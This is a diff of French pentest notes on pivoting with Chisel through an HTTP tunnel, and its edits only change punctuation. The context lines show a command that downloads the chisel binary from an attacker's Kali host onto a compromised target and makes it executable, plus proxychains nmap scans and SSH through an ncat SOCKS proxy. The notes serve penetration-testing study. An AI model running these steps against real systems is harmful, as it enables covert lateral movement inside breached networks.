@@ -2,7 +2,7 @@
 
 ## Chisel
 
-Encapsule le trafic dans HTTP (avec chiffrement SSH à l'intérieur). Utile quand un DPI bloque tout sauf HTTP — les tunnels SSH classiques sont alors inopérants.
+Encapsule le trafic dans HTTP (avec chiffrement SSH à l'intérieur). Utile quand un DPI bloque tout sauf HTTP -  les tunnels SSH classiques sont alors inopérants.
 
 Modèle client/serveur : le serveur tourne sur Kali, le client sur la machine compromise. Le trafic sortant de la cible est du HTTP valide.
 
@@ -22,7 +22,7 @@ python3 -m http.server
 > ```
 
 ```bash
-# Sur la cible — télécharger et rendre exécutable
+# Sur la cible -  télécharger et rendre exécutable
 wget <IP_KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 ```
 
@@ -55,25 +55,25 @@ ss -ntplu | grep 1080
 
 ## Utiliser le tunnel
 
-**Avec Proxychains** — configurer `/etc/proxychains4.conf` :
+**Avec Proxychains** -  configurer `/etc/proxychains4.conf` :
 
 ```
 socks5 127.0.0.1 1080
 ```
 
-> **`socks5` obligatoire** — Chisel crée un tunnel SOCKS5, pas SOCKS4. Laisser `socks4` (valeur par défaut de proxychains4) fait silencieusement échouer toutes les connexions.
+> **`socks5` obligatoire** -  Chisel crée un tunnel SOCKS5, pas SOCKS4. Laisser `socks4` (valeur par défaut de proxychains4) fait silencieusement échouer toutes les connexions.
 
 ```bash
 proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
 ```
 
-**SSH via ProxyCommand** — sans passer par Proxychains :
+**SSH via ProxyCommand** -  sans passer par Proxychains :
 
 ```bash
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<IP_CIBLE>
 ```
 
-> `ncat` (paquet `ncat`) est nécessaire — le netcat Kali par défaut ne supporte pas le proxying SOCKS.
+> `ncat` (paquet `ncat`) est nécessaire -  le netcat Kali par défaut ne supporte pas le proxying SOCKS.
 > ```bash
 > sudo apt install ncat
 > ```
